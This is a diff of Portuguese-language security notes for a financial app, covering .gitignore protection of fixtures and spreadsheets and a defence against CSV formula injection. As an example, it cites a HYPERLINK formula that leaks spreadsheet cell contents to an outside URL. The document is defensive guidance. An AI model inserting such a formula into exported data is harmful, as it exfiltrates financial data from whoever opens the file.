@@ -6,7 +6,7 @@ Este app lida com movimentação financeira real de uma instituição. Os
 pontos abaixo saíram de uma auditoria e **não devem ser afrouxados.**
 
 **`.gitignore` protege `fixtures/` e toda planilha.** Antes não protegia:
-só por sorte nenhum razão real foi commitado. Commit não se apaga — uma
+só por sorte nenhum arquivo real foi commitado. Commit não se apaga — uma
 vez versionado, o dado sobrevive no histórico e em todo clone. A regra é
 `fixtures/*` com exceção para `*.mjs`, mais `*.xlsx`/`*.csv`/etc. em
 qualquer pasta.
@@ -14,7 +14,7 @@ qualquer pasta.
 **Injeção de fórmula no CSV** (`neutralizarFormula`). Excel avalia como
 fórmula qualquer célula iniciada por `= + - @` tab ou CR. Uma descrição
 de conta como `=HYPERLINK("http://...&"&A1)` vira link que exfiltra dados
-da planilha. O texto vem do plano de contas e do histórico do razão —
+da planilha. O texto vem do plano de contas e da descrição das contas —
 dados que o app não controla — e o destino do CSV é ser aberto no Excel
 por um contador. A defesa é prefixar com aspa simples. O Excel (xlsx)
 não precisa disso: SheetJS grava célula de texto como texto, não fórmula.
